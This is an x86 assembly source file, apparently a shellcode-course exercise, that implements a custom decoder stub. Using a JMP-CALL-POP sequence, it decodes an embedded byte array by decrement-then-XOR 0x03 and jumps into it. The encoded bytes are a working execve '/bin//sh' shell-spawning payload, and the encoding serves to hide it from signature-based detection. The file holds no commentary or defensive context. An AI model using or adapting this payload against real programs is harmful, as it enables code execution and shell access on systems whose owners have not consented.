; custom_decoder.asm
; Author: Dennis Tan
; Date: 09-May-2020

global _start

section .text
_start:
        jmp short call_shellcode

decoder: 
        pop esi
        xor ecx, ecx
        mov cl, len

decode:
        dec byte [esi]
        xor byte [esi], 0x03
        inc esi
        loop decode

        jmp short Encodedshellcode

call_shellcode:
        call decoder
        Encodedshellcode: db 0x33,0xc4,0x54,0x6c,0x2d,0x2d,0x71,0x6c,0x6c,0x2d,0x62,0x6b,0x6e,0x8b,0xe1,0x54,0x8b,0xe2,0x51,0x8b,0xe3,0xb4,0x09,0xcf,0x84
        len equ $ - Encodedshellcode
